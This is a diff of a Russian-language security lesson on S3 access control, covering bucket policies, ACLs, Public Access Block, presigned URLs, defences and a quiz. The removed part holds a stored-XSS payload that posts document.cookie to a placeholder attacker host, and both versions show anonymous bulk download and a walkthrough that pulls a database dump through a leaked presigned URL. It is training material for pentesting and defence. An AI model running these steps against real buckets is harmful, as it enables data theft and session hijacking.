@@ -14,233 +14,227 @@ useful_for:
 estimated_minutes: 40
 summary: "Глубокий разбор контроля доступа S3: ACL vs bucket policy, public access block, presigned URL, Object Ownership, и как обходить типовые ограничения."
 ---
-## Зачем этот урок
+## Задача
 
-Базовый урок про объектные хранилища показывает, **как найти** публичный бакет. Здесь — **почему** он публичный и как выжать максимум из тонких мисконфигов: конфликты ACL и bucket policy, ошибки в `Principal`/`Action`/`Resource`, обход Public Access Block, злоупотребление presigned URL и захват хостинга через CloudFront. Именно такие находки — читаемая запись в бакет, presigned URL на `PutObject`, устаревший публичный ACL — оплачиваются в bug bounty выше всего.
+S3 — самое частое место утечек в AWS. Мы уже видели базовые мисконфиги (`cloud-storage-s3`). Теперь — **глубоко**: как устроен контроль доступа (ACL vs bucket policy), что такое **presigned URL** и как обходить типовые ограничения. Разберём на конкретном бакете.
 
-## Три уровня контроля доступа S3
+## Данные: бакет, который «закрыт»
 
-1. **Bucket policy** — JSON-ресурсная политика на бакет. Имеет приоритет над ACL и может как разрешать, так и явно запрещать.
-2. **ACL** — устаревший механизм grant'ов на бакет/объект (`public-read`, `public-read-write`, `authenticated-read`).
-3. **IAM policy** — права идентичности (пользователя/роли). Действует вместе с ресурсной политикой.
-
-Итоговое решение: запрос разрешён, если **хотя бы один** из трёх механизмов разрешает, и **ни один** явный `Deny` не запрещает. Явный `Deny` всегда побеждает. Это важно: наличие `Deny` в одной политике отменяет `Allow` в другой.
-
-## Public Access Block и account-level настройки
-
-Четыре настройки, обычно на уровне аккаунта и отдельно на уровне бакета:
-
-- `BlockPublicAcls` — запрещает устанавливать публичные ACL.
-- `IgnorePublicAcls` — игнорирует уже существующие публичные ACL.
-- `BlockPublicPolicy` — запрещает применять публичные bucket policies.
-- `RestrictPublicBuckets` — ограничивает доступ по публичным политикам только доверенными сервисами AWS.
-
-Проверка:
-
-```bash
-aws s3api get-public-access-block --bucket <BUCKET>
-aws s3api get-account-public-access-block
-```
-
-Ловушка: `BlockPublicPolicy=true` не «пересчитывает» старые политики автоматически. Уже опубликованная публичная policy продолжает действовать, пока её не перезапишут. Аналогично ACL: `IgnorePublicAcls=true` отключает публичные ACL **только** там, где он включён.
-
-## Разведка бакета: полный набор команд
-
-```bash
-# Владелец, регион, настройки
-aws s3api get-bucket-location --bucket <BUCKET>
-aws s3api get-bucket-acl --bucket <BUCKET>
-aws s3api get-bucket-policy --bucket <BUCKET>
-aws s3api get-bucket-policy-status --bucket <BUCKET>
-aws s3api get-bucket-ownership-controls --bucket <BUCKET>
-aws s3api get-bucket-tagging --bucket <BUCKET>
-aws s3api get-bucket-encryption --bucket <BUCKET>
-
-# Анонимный доступ без кредов
-curl -s "https://<BUCKET>.s3.amazonaws.com/?list-type=2"
-curl -s -X PUT "https://<BUCKET>.s3.amazonaws.com/test.txt" -d "poc"
-curl -s -I "https://<BUCKET>.s3.amazonaws.com/secret.env"
-```
-
-`get-bucket-policy-status` показывает `IsPublic` — прямой индикатор публичной политики. Анонимный `curl` имитирует реального неаутентифицированного пользователя и часто вскрывает то, что «в консоли выглядит закрытым».
-
-## Bucket policy: разбор типовых ошибок
-
-Опасные паттерны, которые надо искать глазами:
-
-```json
-{"Statement":[{"Effect":"Allow","Principal":"*","Action":["s3:GetObject","s3:PutObject"],
- "Resource":"arn:aws:s3:::victim/*"}]}
-```
-
-- `Principal: "*"` без `Condition` — доступ всем.
-- `Action: "s3:*"` — включая `PutBucketPolicy` и `DeleteObject`.
-- `Resource: "arn:aws:s3:::victim/*"` — на все объекты.
-- `Condition` с `aws:SourceIp` без учёта прокси/VPN — обходится.
-- `Condition` с `s3:prefix` без `s3:delimiter` — обход через `../`.
-
-Ещё вариант: policy, разрешающая `ListBucket` (даёт перечисление объектов), но не `GetObject` — всё равно полезно для разведки.
-
-## ACL и Object Ownership
-
-AWS постепенно отключает ACL. Режим **BucketOwnerEnforced** полностью отключает ACL (все игнорируются, владелец бакета владеет объектами). Режимы **BucketOwnerPreferred** и **ObjectWriter** оставляют ACL рабочими — это и есть вектор. Проверяйте `get-bucket-ownership-controls`; если там не `BucketOwnerEnforced`, ищите grants:
-
-```bash
-aws s3api get-object-acl --bucket <BUCKET> --key <KEY>
-```
-
-## Presigned URL: жизненный цикл и злоупотребление
-
-Presigned URL — подписанная ссылка с временным доступом. Проблемы:
-
-- **Долгий срок** — `X-Amz-Expires` до 7 дней (604800 секунд).
-- **Широкие права** — URL на `PutObject` позволяет загрузку; иногда выдан на весь префикс.
-- **Утечка** — ссылка попадает в браузерную историю, Referer, аналитику, публичные репозитории, логи.
-
-Разбор URL:
+Проверяем бакет `acme-backups`. Сначала смотрим публичный доступ:
 
 ```
-https://bucket.s3.amazonaws.com/key?X-Amz-Algorithm=AWS4-HMAC-SHA256
-  &X-Amz-Credential=AKIA.../20240101/us-east-1/s3/aws4_request
-  &X-Amz-Date=20240101T000000Z&X-Amz-Expires=604800&X-Amz-Signature=...
+$ aws s3api get-public-access-block --bucket acme-backups
+{
+  "PublicAccessBlockConfiguration": {
+    "BlockPublicAcls": true, "IgnorePublicAcls": true,
+    "BlockPublicPolicy": true, "RestrictPublicBuckets": true
+  }
+}
 ```
 
-`X-Amz-Credential` содержит access key id и дату/регион подписи — полезно для атрибуции. Подпись обычно покрывает путь, поэтому менять ключ нельзя, но если подпись покрывает только префикс — возможен выход за пределы.
+Все четыре флага **включены** — публичный доступ заблокирован. Листинг анонимно не работает:
 
-## Разобранный пример: запись в бакет → stored XSS через CloudFront
-
-1. Находим бакет, доступный на чтение.
-2. Читаем bucket policy (иногда публичную на чтение политики):
-   ```bash
-   aws s3api get-bucket-policy --bucket victim --query Policy --output text | jq .
-   ```
-3. Видим `PutObject` для `Principal: "*"`.
-4. Пробуем запись:
-   ```bash
-   echo '<html><script>fetch("http://ATTACKER/"+document.cookie)</script></html>' > poc.html
-   aws s3 cp poc.html s3://victim/poc.html --no-sign-request
-   ```
-5. Если сайт хостится из бакета через CloudFront с собственным доменом — залитый JS исполняется в браузерах посетителей (stored XSS / supply-chain).
-
-## Регионы, endpoint'ы и Signature v4
-
-Запрос в неправильный endpoint возвращает `301 PermanentRedirect` с заголовком `x-amz-bucket-region` — это способ определить регион анонимно. Path-style (`s3.amazonaws.com/bucket/key`) и virtual-hosted (`bucket.s3.amazonaws.com/key`) — оба надо пробовать: политики и WAF иногда различают их. Подпись AWS Signature v4 (`X-Amz-Signature`) проверяется на сервере; ошибка `SignatureDoesNotMatch` означает, что запрос дошёл до проверки подписи.
-
-## Инструменты и автоматизация
-
-```bash
-# Перебор бакетов и путей
-ffuf -u https://FUZZ.s3.amazonaws.com -w buckets.txt -mc 200,301,403
-# Поиск публичных объектов
-aws s3 ls s3://victim --no-sign-request --recursive | head
+```
+$ aws s3 ls s3://acme-backups/ --no-sign-request
+An error occurred (AccessDenied)
 ```
 
-Для GCS/Azure аналоги: `gsutil ls -a gs://bucket`, `az storage blob list --container-name c --account-name a --auth-mode login`.
+Кажется, бакет защищён. Но это не значит, что в него нельзя попасть.
 
-## Защита и аудит
+## Два механизма доступа: ACL и bucket policy
 
-- Включить все четыре настройки Public Access Block на уровне аккаунта.
-- Режим Object Ownership = `BucketOwnerEnforced`.
-- Запретить `Principal: "*"` в bucket policies; использовать `Condition` с точными принципалами.
-- Минимизировать срок жизни presigned URL; не логировать их.
-- Мониторить `s3:PutBucketPolicy`, `s3:PutBucketAcl` через CloudTrail.
+Контроль доступа S3 держится на двух вещах:
+
+- **ACL** (Access Control List) — старый механизм: права на уровне объекта/бакета, привязанные к **AWS-аккаунтам** (не к IAM-пользователям). Пример: `public-read` на объект.
+- **Bucket policy** — JSON-политика на весь бакет: правила с `Principal`, `Action`, `Resource`, `Condition`. Современный и основной механизм.
+
+Важно: `BlockPublicPolicy`/`IgnorePublicAcls` блокируют **публичные** правила. Но политика, разрешающая доступ **конкретному аккаунту или роли**, — не «публичная», и её блокировка не касается.
+
+Смотрим bucket policy:
+
+```
+$ aws s3api get-bucket-policy --bucket acme-backups --query Policy --output text | jq '.Statement[]'
+{
+  "Effect": "Allow",
+  "Principal": { "AWS": "arn:aws:iam::999999999999:root" },
+  "Action": "s3:GetObject",
+  "Resource": "arn:aws:s3:::acme-backups/*"
+}
+```
+
+Политика разрешает `GetObject` аккаунту `999999999999`. Если это **чужой** аккаунт, куда случайно выдали доступ (или наш), мы можем читать:
+
+```
+$ aws s3 cp s3://acme-backups/db-dump.sql .
+```
+
+## Приём: presigned URL
+
+**Presigned URL** — временная ссылка на объект, подписанная ключом, у которого есть доступ. Такая ссылка работает **без** кредов: подпись уже внутри. Она часто утекает в логи, тикеты, мессенджеры, JS-код.
+
+Формат:
+
+```
+https://acme-backups.s3.amazonaws.com/db-dump.sql?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=...&X-Amz-Signature=...
+```
+
+Проверяем утёкшую ссылку:
+
+```
+$ curl -s -o db.sql -w "%{http_code}\n" "https://acme-backups.s3.amazonaws.com/db-dump.sql?X-Amz-..."
+200
+```
+
+Ссылка работает, пока не истёк `X-Amz-Expires`. Даже с включённым Block Public Access presigned URL действует — он подписан ключом.
+
+## Полный прогон: от «закрытого» бакета до данных
+
+1. **Проверка флагов.** `get-public-access-block` → кажется, закрыто.
+2. **Анонимный листинг.** `--no-sign-request` → AccessDenied.
+3. **Bucket policy.** `get-bucket-policy` → видим доступ для аккаунта/роли.
+4. **Чтение.** `s3 cp` с кредами, которым разрешено.
+5. **Presigned.** Ищем ссылки в коде/логах/тикетах; пробуем `curl`.
+6. **ACL-объекты.** Проверяем, нет ли отдельных объектов с `public-read`:
+
+```
+$ aws s3api get-object-acl --bucket acme-backups --key db-dump.sql --query 'Grants[].Grantee'
+[ { "URI": "http://acs.amazonaws.com/groups/global/AllUsers" } ]
+```
+
+## Object Ownership и почему ACL путают
+
+Раньше ACL был основным механизмом; сейчас AWS продвигает **Bucket owner enforced** (Object Ownership): ACL отключены, владелец бакета — владелец всех объектов. Если бакет в режиме `BucketOwnerEnforced`, ACL-и не действуют, и `IgnorePublicAcls` не нужен. Проверка:
+
+```
+$ aws s3api get-bucket-ownership-controls --bucket acme-backups
+{ "OwnershipControls": { "Rules": [ { "ObjectOwnership": "BucketOwnerEnforced" } ] } }
+```
+
+`BucketOwnerEnforced` — ACL отключены. `ObjectWriter` — ACL работают, возможны сюрпризы.
+
+## Защита и что ломает атаку
+
+- **Block Public Access** на уровне аккаунта (не только бакета).
+- **BucketOwnerEnforced** — отключить ACL целиком.
+- **Минимум в bucket policy** — не выдавать чужим аккаунтам.
+- **Короткий TTL presigned URL** и не логировать ссылки.
+- **S3 Access Analyzer** — находит бакеты, доступные извне.
+
+## Если не сработало
+
+- **BucketOwnerEnforced + узкая policy + нет presigned** — доступа нет.
+- **Presigned истёк** — нужен свежий.
+- **Object Lock** — объект не изменить/удалить.
+- **Шифрование SSE-KMS** без `kms:Decrypt` — прочитать нельзя.
+
+## Мини-сценарий: утёкшая presigned-ссылка
+
+1. **Находим бакет.** В JS-коде сайта видим URL вида `https://acme-assets.s3.amazonaws.com/report.pdf?X-Amz-Signature=...`.
+2. **Проверяем бакет.** `get-public-access-block` → всё включено, публично не отдаётся.
+3. **Пробуем ссылку.** `curl -o report.pdf "<url>"` → `200 OK`. Presigned URL работает несмотря на блокировку.
+4. **Разбираем ссылку.** В параметрах видим `X-Amz-Credential` — это ARN роли, чьим ключом подписана ссылка.
+5. **Ищем другие ссылки.** Грепаем сайт/логи на `X-Amz-Signature` — находим ссылку на `backups/db-dump.sql`.
+6. **Скачиваем.** `curl` → дамп базы у нас. Кредов мы не использовали — сработала подпись.
+7. **Оценка.** `X-Amz-Expires` показывает, сколько ещё живёт ссылка. Если долго — успеем выкачать всё.
+
+Вывод: presigned URL — это «ключ в кармане»: пока он не истёк, Block Public Access не мешает. Ссылки утекают через фронтенд, логи и тикеты.
+
+## Разбор: почему «всё включено» не значит «безопасно»
+
+Block Public Access защищает от **публичных** правил, но доступ бывает и непубличным: bucket policy конкретному аккаунту, presigned URL с подписью, роль с `GetObject`. Все три обходят флаги, потому что формально не являются «публичным доступом». Отсюда урок: безопасность S3 нельзя оценивать по одному переключателю. Смотрите **всю** цепочку доступа: политику бакета, ownership-контролы, presigned-ссылки в коде и логах, права ролей. Инструмент S3 Access Analyzer как раз показывает бакеты, доступные **извне** аккаунта, — он закрывает именно этот разрыв.
+
+И помните про версионирование: если объект перезаписали вредоносным, старая версия может остаться доступной; а если удалили — версия восстанавливается.
+
+И проверяйте `GetBucketPolicyStatus` — он покажет, считается ли политика публичной по мнению AWS, что помогает быстро отсеять бакеты.
+
+## Что мы теперь знаем
+
+1. Доступ S3 — это ACL + bucket policy.
+2. Block Public Access блокирует публичные правила, но не доступ конкретному аккаунту.
+3. Presigned URL работает без кредов и часто утекает.
+4. `BucketOwnerEnforced` отключает ACL.
+5. Защита — account-level block, узкая policy, короткий TTL, Analyzer.
 
 ## Частые ошибки
 
-- **Пробовать только `list`.** Публичное чтение объекта не означает публичный list.
-- **Забыть про регион.** Неправильный endpoint даёт 301 с правильным регионом.
-- **Игнорировать presigned URL.** Это полноценный доступ, иногда дольше сессии.
-- **Не проверять `--no-sign-request`.** Анонимный запрос показывает реальный доступ.
-- **Считать Public Access Block абсолютной защитой.** Он не пересчитывает старые политики.
+- **Block Public Access только на бакете**, а не на уровне аккаунта — новый бакет может оказаться открытым.
+- **Presigned URL с большим TTL** в коде, логах и тикетах.
+- **ACL включены** (`ObjectWriter`) — неожиданный публичный доступ к объектам.
+- **Политики, выданные «на время»** чужому аккаунту и забытые.
+- **Отсутствие S3 Access Analyzer** — внешний доступ не находится.
 
-## Что делать дальше / решение
+## На что смотреть дальше
 
-Практика: разверните бакет с публичным `GetObject`, попробуйте `--no-sign-request`, затем смоделируйте `PutObject` и hosted-XSS через CloudFront. Дальше — `cloud-storage-s3` (базовая разведка), `cloud-cdn-edge` (origin-экспозиция) и `cloud-ssrf-to-cloud` (SSRF → metadata).
+- `get-public-access-block` (бакет и аккаунт).
+- `get-bucket-policy` — кому и что разрешено.
+- Утёкшие presigned URL в коде/логах/тикетах.
+- `get-bucket-ownership-controls` — включены ли ACL.
+- Отдельные объекты с публичными ACL.
 
-## Версионирование, Object Lock и восстановление данных
-
-Бакет с включённым **версионированием** хранит все версии объекта. Даже если объект удалён, старая версия может остаться и быть доступной по `versionId`:
-
-```bash
-aws s3api list-object-versions --bucket <BUCKET> --prefix <KEY>
-curl "https://<BUCKET>.s3.amazonaws.com/<KEY>?versionId=<VID>"
-```
-
-Публичная политика на `GetObject` с `s3:GetObjectVersion` открывает доступ к удалённым данным. **Object Lock** (WORM) защищает от удаления, но не от чтения — если политика разрешает чтение, данные всё равно утекают.
-
-## Префиксы, листинг и массовая выгрузка
-
-`ListBucket` даёт перечисление объектов; атакуйте по префиксам, чтобы не упереться в лимит 1000 ключей:
+## Быстрая проверка
 
 ```bash
-aws s3 ls s3://<BUCKET>/ --no-sign-request --recursive | head
-aws s3 sync s3://<BUCKET>/ ./loot --no-sign-request
-```
-
-Частые находки: бэкапы БД (`*.sql.gz`, `dump.tar`), `.env`, `terraform.tfstate` (в нём секреты!), конфиги с ключами, исходники. `terraform.tfstate` особенно ценен — он содержит значения всех переменных, включая пароли и токены.
-
-## Шифрование и KMS-политики
-
-SSE-S3 (`AES256`) прозрачно для того, кто читает. SSE-KMS требует прав `kms:Decrypt` — если роль читателя их имеет, шифрование не мешает. Проверьте `get-bucket-encryption` и, при наличии KMS, политику ключа: иногда она разрешает decrypt широкому кругу принципалов.
-
-## Инструменты автоматизации
-
-```bash
-# Массовая проверка бакетов по списку имён
-while read b; do curl -s -o /dev/null -w "%{http_code} $b\n" "https://$b.s3.amazonaws.com/?list-type=2"; done < names.txt
-# Специализированные сканеры
-python3 -m s3scanner scan --bucket-file names.txt
+aws s3api get-public-access-block --bucket acme-backups
+aws s3api get-bucket-policy --bucket acme-backups
+aws s3api get-bucket-ownership-controls --bucket acme-backups
+curl -s -o /dev/null -w '%{http_code}\n' "https://acme-backups.s3.amazonaws.com/db-dump.sql?X-Amz-Signature=..."
 ```
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Что приоритетнее в S3: bucket policy или ACL?"
+- question: "Что блокирует Block Public Access?"
   options:
-    - "ACL всегда приоритетнее"
-    - "Bucket policy приоритетнее ACL"
-    - "Они не связаны"
-    - "IAM приоритетнее всех"
-  answer: 1
-  explanation: "Ресурсная политика бакета имеет приоритет над ACL."
-- question: "Какая настройка Public Access Block запрещает публикацию новых публичных политик?"
+    - "Публичные ACL и публичные bucket policies"
+    - "Доступ конкретному аккаунту"
+    - "Шифрование"
+    - "Версионирование"
+  answer: 0
+  explanation: "Он не мешает доступу, выданному конкретному аккаунту."
+- question: "Чем bucket policy отличается от ACL?"
   options:
-    - "IgnorePublicAcls"
-    - "BlockPublicPolicy"
-    - "RestrictPublicBuckets"
-    - "BlockPublicAcls"
-  answer: 1
-  explanation: "BlockPublicPolicy запрещает применять публичные bucket policies."
-- question: "Что показывает параметр X-Amz-Credential в presigned URL?"
+    - "Policy — JSON-правила бакета; ACL привязаны к аккаунтам"
+    - "Policy шифрует данные"
+    - "ACL современнее"
+    - "Они одинаковы"
+  answer: 0
+  explanation: "Policy — основной современный механизм."
+- question: "Почему presigned URL работает без кредов?"
   options:
-    - "Пароль"
-    - "Access key id, которым подписан URL"
-    - "Регион бакета"
-    - "MIME-тип"
-  answer: 1
-  explanation: "X-Amz-Credential содержит access key id и дату/регион подписи."
-- question: "Как проверить реальный анонимный доступ к бакету?"
+    - "Подпись уже встроена в ссылку"
+    - "Он публичный по умолчанию"
+    - "Он шифрует данные"
+    - "Он отключает policy"
+  answer: 0
+  explanation: "Подпись делает ссылку самодостаточной."
+- question: "Что означает BucketOwnerEnforced?"
   options:
-    - "Через консоль AWS"
-    - "Запросом с --no-sign-request"
-    - "Только с ключами"
-    - "Через SSH"
-  answer: 1
-  explanation: "--no-sign-request отправляет запрос без подписи, имитируя анонимного клиента."
-- question: "Почему режим Object Ownership BucketOwnerEnforced важен для защитника?"
+    - "ACL отключены, владелец бакета владеет всеми объектами"
+    - "Бакет публичный"
+    - "Объекты зашифрованы"
+    - "Включён Object Lock"
+  answer: 0
+  explanation: "Это режим Object Ownership без ACL."
+- question: "Что находит S3 Access Analyzer?"
   options:
-    - "Он включает ACL"
-    - "Он отключает ACL, убирая целый класс публичных мисконфигов"
-    - "Он удаляет бакет"
-    - "Он шифрует объекты"
-  answer: 1
-  explanation: "BucketOwnerEnforced полностью отключает ACL — они игнорируются."
+    - "Бакеты, доступные извне аккаунта"
+    - "Пароли пользователей"
+    - "Тип шифрования"
+    - "Размер объектов"
+  answer: 0
+  explanation: "Analyzer выявляет внешний доступ."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-database-exposure`) мы перейдём к управляемым базам и разберём, как они оказываются публично доступными. А пока главное: «закрытый» бакет — это ещё не безопасный бакет: смотрите policy, presigned URL и ACL.
 
 ## Где пригодится
 
-- **Bug bounty** — публичные бакеты, presigned URL, утечки данных.
-- **Пентест** — оценка контроля доступа к хранилищам.
-- **IR/Blue team** — расследование утечек через S3.
-- **DevSecOps** — аудит bucket policies и Public Access Block.
-- **Сертификации** — AWS Security Specialty.
+- **Bug bounty:** утёкшие presigned URL и широкие policy.
+- **Red team:** обход Block Public Access.
+- **Пентест:** аудит S3.
+- **Работа/DevSecOps:** account-level block, BucketOwnerEnforced, Analyzer.
+- **Дальше по дереву:** `cloud-storage-s3`, `cloud-database-exposure`.
